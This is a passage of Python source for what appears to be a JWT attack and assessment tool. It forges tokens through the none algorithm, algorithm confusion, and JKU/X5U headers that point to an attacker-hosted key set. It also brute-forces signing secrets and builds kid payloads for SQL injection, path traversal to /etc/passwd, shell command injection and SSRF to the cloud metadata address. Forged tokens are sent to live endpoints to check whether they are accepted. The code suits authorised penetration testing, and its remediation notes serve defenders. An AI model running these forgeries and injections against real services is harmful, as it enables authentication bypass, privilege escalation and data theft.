            "attack_type": JWTAttackType.ALG_CONFUSION.value,
            "original_token": original_token,
            "original_algorithm": header.get("alg"),
            "target_algorithm": "HS256",
            "description": "Algorithm confusion: sign with public key as HMAC secret",
            "severity": Severity.CRITICAL.value,
            "verified": False,
        }

        # Try to discover JWKS and get public key
        if target_url and self.jwks_analyzer:
            base_url = urllib.parse.urljoin(target_url, "/")
            jwks_info = self.jwks_analyzer.discover_jwks(base_url)

            if jwks_info and jwks_info.public_keys_pem:
                result["jwks_discovered"] = True
                result["jwks_url"] = jwks_info.url
                result["public_keys_found"] = len(jwks_info.public_keys_pem)

                # Generate attack tokens
                if self.rsa_attacker:
                    attack_tokens = []
                    for pem in jwks_info.public_keys_pem:
                        try:
                            variants = self.rsa_attacker.algorithm_confusion_variants(
                                original_token, pem
                            )
                            attack_tokens.extend(variants)
                        except Exception:
                            pass

                    result["attack_tokens"] = attack_tokens

                    # Test if available
                    if http_tester and attack_tokens:
                        tokens_to_test = [v["token"] for v in attack_tokens]
                        test_results = http_tester.test_tokens_batch(
                            tokens_to_test, stop_on_success=True
                        )
                        for test_result in test_results:
                            if test_result.accepted:
                                result["verified"] = True
                                result["accepted_token"] = test_result.token
                                break

        result["exploitation_steps"] = [
            "1. Obtain the server's public key (often at /.well-known/jwks.json)",
            "2. Change algorithm from RS256 to HS256 in header",
            "3. Sign the token using the public key as the HMAC secret",
            "4. Submit the forged token",
        ]

        result["remediation"] = "Explicitly specify allowed algorithms in JWT verification"

        return result

    def _test_weak_secret(
        self,
        token: str,
        http_tester: Optional[JWTTester] = None
    ) -> Optional[Dict]:
        """Brute force weak HMAC secrets with parallel processing."""
        parts = token.split('.')
        if len(parts) != 3:
            return None

        message = f"{parts[0]}.{parts[1]}"
        target_sig = parts[2]

        target_sig_padded = target_sig + '=' * (4 - len(target_sig) % 4)
        try:
            target_sig_bytes = base64.urlsafe_b64decode(target_sig_padded)
        except Exception:
            return None

        # Determine hash based on signature length
        if len(target_sig_bytes) == 32:
            hash_func = hashlib.sha256
        elif len(target_sig_bytes) == 48:
            hash_func = hashlib.sha384
        elif len(target_sig_bytes) == 64:
            hash_func = hashlib.sha512
        else:
            return None

        # Quick check with common secrets first
        for secret in self.weak_secrets:
            computed = hmac.new(
                secret.encode(),
                message.encode(),
                hash_func
            ).digest()

            if computed == target_sig_bytes:
                return {
                    "attack_type": JWTAttackType.WEAK_SECRET.value,
                    "original_token": token,
                    "discovered_secret": secret,
                    "description": f"JWT signed with weak secret: '{secret}'",
                    "severity": Severity.CRITICAL.value,
                    "verified": True,
                    "exploitation": "Use this secret to forge any JWT with arbitrary claims",
                    "remediation": "Use cryptographically random secret of at least 256 bits",
                }

        # Parallel brute force with extended list
        discovered = self.brute_forcer.brute_force(token, self.extended_secrets)

        if discovered:
            return {
                "attack_type": JWTAttackType.WEAK_SECRET.value,
                "original_token": token,
                "discovered_secret": discovered,
                "description": f"JWT signed with weak secret: '{discovered}'",
                "severity": Severity.CRITICAL.value,
                "verified": True,
                "exploitation": "Use this secret to forge any JWT with arbitrary claims",
                "remediation": "Use cryptographically random secret of at least 256 bits",
            }

        return {
            "attack_type": JWTAttackType.WEAK_SECRET.value,
            "original_token": token,
            "description": "Weak secret not found in tested wordlist",
            "severity": Severity.INFO.value,
            "verified": False,
            "recommendation": "Run extended brute force with larger wordlist",
            "hashcat_command": f"hashcat -m 16500 '{token}' wordlist.txt",
            "john_command": "john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256",
        }

    def _test_kid_injection(
        self,
        header: Dict,
        payload: Dict,
        original_token: str,
        http_tester: Optional[JWTTester] = None
    ) -> Optional[Dict]:
        """Test KID (Key ID) injection attacks."""
        kid_payloads = [
            # SQL injection via kid
            {"kid": "' UNION SELECT 'secret'--", "type": "sqli", "secret": "secret"},
            {"kid": "' OR '1'='1", "type": "sqli", "secret": ""},
            {"kid": "' UNION SELECT NULL--", "type": "sqli", "secret": ""},

            # Path traversal via kid
            {"kid": "../../../dev/null", "type": "path_traversal", "secret": ""},
            {"kid": "/dev/null", "type": "path_traversal", "secret": ""},
            {"kid": "../../../etc/passwd", "type": "path_traversal", "secret": ""},
            {"kid": "....//....//....//dev/null", "type": "path_traversal", "secret": ""},

            # Command injection via kid
            {"kid": "key.pem|cat /etc/passwd", "type": "command_injection", "secret": "test"},
            {"kid": "key.pem;id", "type": "command_injection", "secret": "test"},
            {"kid": "key.pem`id`", "type": "command_injection", "secret": "test"},
            {"kid": "key.pem$(id)", "type": "command_injection", "secret": "test"},

            # SSRF via kid
            {"kid": f"http://{self.callback_host}/key", "type": "ssrf", "secret": "test"},
            {"kid": "http://169.254.169.254/latest/meta-data/", "type": "ssrf_aws", "secret": "test"},
            {"kid": "http://localhost:8080/admin", "type": "ssrf_internal", "secret": "test"},
        ]

        injected_tokens = []
        for injection in kid_payloads:
            modified_header = header.copy()
            modified_header["kid"] = injection["kid"]
            modified_header["alg"] = "HS256"

            token = self.encode_token(
                modified_header, payload, injection["secret"], "HS256"
            )

            injected_tokens.append({
                "token": token,
                "kid": injection["kid"],
                "injection_type": injection["type"],
                "secret_used": injection["secret"]
            })

        # Test via HTTP if available
        verified = []
        if http_tester:
            tokens_to_test = [t["token"] for t in injected_tokens]
            results = http_tester.test_tokens_batch(tokens_to_test)
            for i, result in enumerate(results):
                if result.accepted:
                    verified.append({
                        **injected_tokens[i],
                        "http_result": {
                            "status_code": result.status_code,
                            "response_length": result.response_length
                        }
                    })

        return {
            "attack_type": JWTAttackType.KID_INJECTION.value,
            "original_token": original_token,
            "injected_tokens": injected_tokens,
            "verified_working": verified,
            "description": "KID header injection attacks",
            "severity": Severity.HIGH.value,
            "verified": len(verified) > 0,
            "exploitation": [
                "SQLi: Extract secret from database via UNION injection",
                "Path traversal: Use /dev/null as key file (empty = valid sig with empty key)",
                "Command injection: Execute commands if kid is passed to shell",
                "SSRF: Fetch key from attacker-controlled URL or internal services",
            ],
            "remediation": "Validate kid parameter strictly, avoid dynamic file/db lookups",
        }

    def _test_jku_injection(
        self,
        header: Dict,
        payload: Dict,
        original_token: str
    ) -> Optional[Dict]:
        """Test JKU (JWK Set URL) injection."""
        if not self.rsa_attacker:
            return {
                "attack_type": JWTAttackType.JKU_INJECTION.value,
                "description": "JKU injection (requires cryptography library)",
                "severity": Severity.CRITICAL.value,
                "note": "Install cryptography library for full attack generation"
            }

        # Generate attacker key pair
        private_key, public_key = self.rsa_attacker.generate_key_pair()
        jwk = self.rsa_attacker.public_key_to_jwk(public_key)

        # Create JWKS
        jwks = {"keys": [jwk]}

        # Create token with JKU header
        jku_url = f"https://{self.callback_host}/.well-known/jwks.json"
        attack_header = {
            "alg": "RS256",
            "typ": "JWT",
            "jku": jku_url,
            "kid": jwk["kid"]
        }

        # Sign with our private key
        attack_token = self.rsa_attacker.sign_rs256(attack_header, payload, private_key)

        return {
            "attack_type": JWTAttackType.JKU_INJECTION.value,
            "original_token": original_token,
            "attack_token": attack_token,
            "jku_url": jku_url,
            "description": "JKU header injection - point to attacker's JWKS",
            "severity": Severity.CRITICAL.value,
            "jwks_to_host": jwks,
            "private_key": private_key,
            "exploitation_steps": [
                f"1. Host this JWKS at {jku_url}:",
                json.dumps(jwks, indent=2),
                "2. Ensure the URL is accessible from the target server",
                "3. Submit the attack token",
                "4. Server fetches JWKS from your URL and verifies signature",
            ],
            "remediation": "Whitelist allowed JKU URLs, validate against known issuers",
        }

    def _test_x5u_injection(
        self,
        header: Dict,
        payload: Dict,
        original_token: str
    ) -> Optional[Dict]:
        """Test X5U (X.509 URL) injection."""
        if not self.x5u_attacker:
            return {
                "attack_type": JWTAttackType.X5U_INJECTION.value,
                "description": "X5U injection (requires cryptography library)",
                "severity": Severity.CRITICAL.value,
                "note": "Install cryptography library for full attack generation"
            }

        attack_data = self.x5u_attacker.craft_x5u_token(payload)

        return {
            "attack_type": JWTAttackType.X5U_INJECTION.value,
            "original_token": original_token,
            "attack_token": attack_data["token"],
            "x5u_url": attack_data["x5u_url"],
            "description": "X5U header injection - point to attacker's certificate",
            "severity": Severity.CRITICAL.value,
            "cert_to_host": attack_data["cert_to_host"],
            "private_key": attack_data["private_key"],
            "instructions": attack_data["instructions"],
            "exploitation": attack_data["exploitation"],
            "remediation": "Whitelist allowed X5U URLs, validate certificate chains properly",
        }

    def _generate_claim_tampers(
        self,
        header: Dict,
        payload: Dict,
        original_token: str
    ) -> List[Dict]:
        """Generate claim tampering variants."""
        tampers = []

        # Detect current user info
        current_user = payload.get("sub") or payload.get("user") or payload.get("username")
        current_role = payload.get("role") or payload.get("roles")

        modifications = [
            {"field": "sub", "value": "admin", "description": "Escalate to admin user"},
            {"field": "sub", "value": "root", "description": "Escalate to root user"},
            {"field": "sub", "value": "administrator", "description": "Escalate to administrator"},
            {"field": "role", "value": "admin", "description": "Escalate role to admin"},
            {"field": "roles", "value": ["admin", "superuser"], "description": "Add admin roles"},
            {"field": "is_admin", "value": True, "description": "Set admin flag"},
            {"field": "admin", "value": True, "description": "Set admin flag"},
            {"field": "superuser", "value": True, "description": "Set superuser flag"},
            {"field": "permissions", "value": ["*"], "description": "Grant all permissions"},
            {"field": "scope", "value": "admin read write delete", "description": "Expand OAuth scope"},
            {"field": "aud", "value": "admin-api", "description": "Change audience to admin API"},
        ]

        # Add user ID manipulation if detected
        if "user_id" in payload:
            modifications.append({
                "field": "user_id",
                "value": 1,
                "description": "Change to user_id 1 (often admin)"
            })

        if "uid" in payload:
            modifications.append({
                "field": "uid",
                "value": 0,
                "description": "Change to uid 0 (root)"
            })

        for mod in modifications:
            modified_payload = payload.copy()
            modified_payload[mod["field"]] = mod["value"]

            tampers.append({
                "attack_type": JWTAttackType.CLAIM_TAMPERING.value,
                "modification": mod,
                "modified_payload": modified_payload,
                "description": mod["description"],
                "severity": Severity.HIGH.value,
                "note": "Requires none algorithm or known secret to exploit",
            })

        return tampers

    def _test_exp_bypass(
        self,
        header: Dict,
        payload: Dict,
        original_token: str
    ) -> Optional[Dict]:
        """Test expiration bypass techniques."""
        bypass_tokens = []

        # Remove exp claim
        no_exp_payload = {k: v for k, v in payload.items() if k != "exp"}
        no_exp_header = header.copy()
        no_exp_header["alg"] = "none"
        bypass_tokens.append({
            "technique": "Remove exp claim",
            "token": self.encode_token(no_exp_header, no_exp_payload, "", "none"),
            "payload": no_exp_payload
        })

        # Set exp far in future
        future_exp_payload = payload.copy()
        future_exp_payload["exp"] = int(time.time()) + (10 * 365 * 24 * 60 * 60)
        bypass_tokens.append({
            "technique": "Set exp 10 years in future",
            "token": self.encode_token(no_exp_header, future_exp_payload, "", "none"),
            "payload": future_exp_payload
        })

        # Set negative exp
        neg_exp_payload = payload.copy()
        neg_exp_payload["exp"] = -1
        bypass_tokens.append({
            "technique": "Set negative exp",
            "token": self.encode_token(no_exp_header, neg_exp_payload, "", "none"),
            "payload": neg_exp_payload
        })

        # Set exp as string
        string_exp_payload = payload.copy()
        string_exp_payload["exp"] = "9999999999"
        bypass_tokens.append({
            "technique": "Set exp as string",
            "token": self.encode_token(no_exp_header, string_exp_payload, "", "none"),
            "payload": string_exp_payload
        })

        # Set exp as float
        float_exp_payload = payload.copy()
        float_exp_payload["exp"] = float(time.time()) + 999999999.99
        bypass_tokens.append({
            "technique": "Set exp as float",
            "token": self.encode_token(no_exp_header, float_exp_payload, "", "none"),
            "payload": float_exp_payload
        })

        return {
            "attack_type": JWTAttackType.EXP_BYPASS.value,
            "original_token": original_token,
            "bypass_tokens": bypass_tokens,
            "severity": Severity.MEDIUM.value,
            "note": "Requires none algorithm or known secret to forge token",
            "remediation": "Always validate exp claim exists, is integer, and is in the past",
        }

    def _test_signature_stripping(
        self,
        header: Dict,
        payload: Dict,
        original_token: str,
        http_tester: Optional[JWTTester] = None
    ) -> Optional[Dict]:
        """Test signature stripping/truncation."""
        parts = original_token.split('.')

        stripped_variants = [
            {"token": f"{parts[0]}.{parts[1]}.", "technique": "Empty signature"},
            {"token": f"{parts[0]}.{parts[1]}", "technique": "No signature"},
            {"token": f"{parts[0]}.{parts[1]}.{'a' * 10}", "technique": "Truncated signature"},
            {"token": f"{parts[0]}.{parts[1]}.{'=' * 4}", "technique": "Padding only"},
            {"token": f"{parts[0]}.{parts[1]}.null", "technique": "Literal null"},
        ]

        # Test via HTTP if available
        verified = []
        if http_tester:
            tokens_to_test = [v["token"] for v in stripped_variants]
            results = http_tester.test_tokens_batch(tokens_to_test)
            for i, result in enumerate(results):
                if result.accepted:
                    verified.append({
                        **stripped_variants[i],
                        "accepted": True
                    })

        return {
            "attack_type": JWTAttackType.SIGNATURE_STRIPPING.value,
            "original_token": original_token,
            "stripped_variants": stripped_variants,
            "verified_working": verified,
            "description": "Signature stripping/truncation attacks",
            "severity": Severity.HIGH.value,
            "verified": len(verified) > 0,
            "exploitation": "Some implementations may accept tokens with invalid/missing signatures",
            "remediation": "Always validate signature is present and valid",
        }

    def _test_embedded_jwt(
        self,
        header: Dict,
        payload: Dict,
        original_token: str
    ) -> Optional[Dict]:
        """Test embedded JWT attacks (JWT inside JWT claims)."""
        # Create a malicious inner JWT
        inner_payload = {
            "sub": "admin",
            "role": "superuser",
            "is_admin": True
        }
        inner_header = {"alg": "none", "typ": "JWT"}
        inner_token = self.encode_token(inner_header, inner_payload, "", "none")

        # Embed in various claims
        embedded_variants = []

        for claim in ["data", "user", "token", "jwt", "auth"]:
            modified_payload = payload.copy()
            modified_payload[claim] = inner_token

            outer_header = header.copy()
            outer_header["alg"] = "none"

            embedded_variants.append({
                "claim": claim,
                "token": self.encode_token(outer_header, modified_payload, "", "none"),
                "description": f"Malicious JWT embedded in '{claim}' claim"
            })

        return {
            "attack_type": JWTAttackType.EMBEDDED_JWT.value,
            "original_token": original_token,
            "embedded_variants": embedded_variants,
            "inner_token": inner_token,
            "severity": Severity.MEDIUM.value,
            "description": "Embedded JWT attack - nested malicious token in claims",
            "exploitation": "If app parses nested JWTs without proper validation, inner claims may be trusted",
            "remediation": "Never parse JWTs from untrusted claims, validate all tokens independently",
        }

    def generate_forged_token(
        self,
        payload: Dict,
        secret: str = "",
        algorithm: str = "none"
    ) -> str:
        """
        Generate a forged JWT token.

        Args:
            payload: Claims to include
            secret: Signing secret (empty for none algorithm)
            algorithm: Algorithm to use

        Returns:
            Forged JWT token
        """
        header = {"alg": algorithm, "typ": "JWT"}
        return self.encode_token(header, payload, secret, algorithm)

    def full_assessment(
        self,
        token: str,
        target_url: str = None
    ) -> AssessmentReport:
        """
        Perform full security assessment and generate report.

        Args:
            token: JWT token to assess
            target_url: Optional URL for live testing

        Returns:
            Comprehensive AssessmentReport
        """
        header, payload, signature = self.decode_token(token)

        # Run all scans
        findings = self.scan_token(token, target_url)

        # Count by severity
        critical = sum(1 for f in findings if f.get("severity") == "CRITICAL")
        high = sum(1 for f in findings if f.get("severity") == "HIGH")
        medium = sum(1 for f in findings if f.get("severity") == "MEDIUM")
        low = sum(1 for f in findings if f.get("severity") in ["LOW", "INFO"])

        # Get verified vulnerabilities
        verified = [f for f in findings if f.get("verified", False)]

        # Calculate risk score (0-10)
        risk_score = min(10, (critical * 3) + (high * 2) + (medium * 1) + (low * 0.5))
        if verified:
            risk_score = min(10, risk_score + 2)  # Boost for verified vulns

        # Generate exploitation paths
        exploitation_paths = []
        for finding in verified:
            if finding.get("attack_type") == JWTAttackType.NONE_ALGORITHM.value:
                exploitation_paths.append("Direct token forgery via none algorithm")
            elif finding.get("attack_type") == JWTAttackType.WEAK_SECRET.value:
                secret = finding.get("discovered_secret", "")
                exploitation_paths.append(f"Token forgery using discovered secret: '{secret}'")
            elif finding.get("attack_type") == JWTAttackType.ALG_CONFUSION.value:
                exploitation_paths.append("Token forgery via algorithm confusion attack")

        # Remediation recommendations
        remediation = [
            "Use strong, cryptographically random secrets (256+ bits)",
            "Explicitly specify allowed algorithms in JWT validation",
            "Validate all claims (exp, iat, aud, iss) strictly",
            "Reject 'none' algorithm explicitly",
            "Sanitize kid/jku/x5u header values or use allowlists",
            "Consider asymmetric algorithms (RS256, ES256) for better security",
            "Implement token revocation mechanism",
            "Set reasonable token expiration times",
        ]

        return AssessmentReport(
            target_url=target_url or "N/A",
            token_analyzed=token[:50] + "..." if len(token) > 50 else token,
            header=header,
            payload=payload,
            algorithm=header.get("alg", "unknown"),
            findings=findings,
            critical_count=critical,
            high_count=high,
            medium_count=medium,
            low_count=low,
            verified_vulnerabilities=verified,
            exploitation_paths=exploitation_paths,
            remediation=remediation,
            risk_score=risk_score,
            timestamp=time.time()
        )

    def generate_attack_suite(self, sample_token: str = None) -> Dict[str, Any]:
        """Generate comprehensive JWT attack suite."""
        suite = {
            "none_algorithm_tokens": [],
            "common_secrets": self.weak_secrets,
            "kid_injections": [
                "../../../dev/null",
                "' UNION SELECT 'secret'--",
                "/proc/self/environ",
                "http://169.254.169.254/latest/meta-data/",
            ],
            "claim_escalations": [
                {"sub": "admin"},
                {"role": "administrator"},
                {"is_admin": True},
                {"permissions": ["*"]},
                {"scope": "admin read write delete"},
            ],
            "tools": {
                "jwt_tool": "python3 jwt_tool.py -t <token> -M at",
                "hashcat": "hashcat -m 16500 <token> wordlist.txt",
                "john": "john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256",
            },
            "remediation": [
                "Use strong, random secrets (256+ bits)",
                "Explicitly specify allowed algorithms",
                "Validate all claims (exp, iat, aud, iss)",
                "Don't expose public keys unnecessarily",
                "Sanitize kid/jku/x5u header values",
                "Use asymmetric algorithms (RS256) when possible",
                "Implement token revocation mechanism",
            ]
        }

        if sample_token:
            try:
                header, payload, _ = self.decode_token(sample_token)
                suite["decoded_sample"] = {
                    "header": header,
                    "payload": payload
                }

                # Generate none algorithm variants
                for alg in ["none", "None", "NONE"]:
                    none_header = header.copy()
                    none_header["alg"] = alg
                    suite["none_algorithm_tokens"].append(
                        self.encode_token(none_header, payload, "", "none")
                    )

            except Exception:
                pass

        return suite


# Convenience functions

def analyze_token(token: str, target_url: str = None) -> Dict:
    """Quick JWT analysis with optional HTTP testing."""
    scanner = JWTScanner()
    return scanner.scan_token(token, target_url)


def crack_secret(token: str, wordlist_path: str = None) -> Optional[str]:
    """Attempt to crack JWT secret using parallel brute force."""
    brute_forcer = ParallelBruteForcer()
    return brute_forcer.brute_force(token, wordlist_path=wordlist_path)


def discover_jwks(base_url: str) -> Optional[JWKSInfo]:
    """Discover and analyze JWKS endpoint."""
    analyzer = JWKSAnalyzer()
    return analyzer.discover_jwks(base_url)


def test_token_http(token: str, target_url: str) -> HTTPTestResult:
    """Test if a token is accepted by an endpoint."""
    tester = JWTTester(target_url)
    return tester.test_token(token)


def full_assessment(token: str, target_url: str = None) -> AssessmentReport:
    """Perform full JWT security assessment."""
    scanner = JWTScanner()
    return scanner.full_assessment(token, target_url)
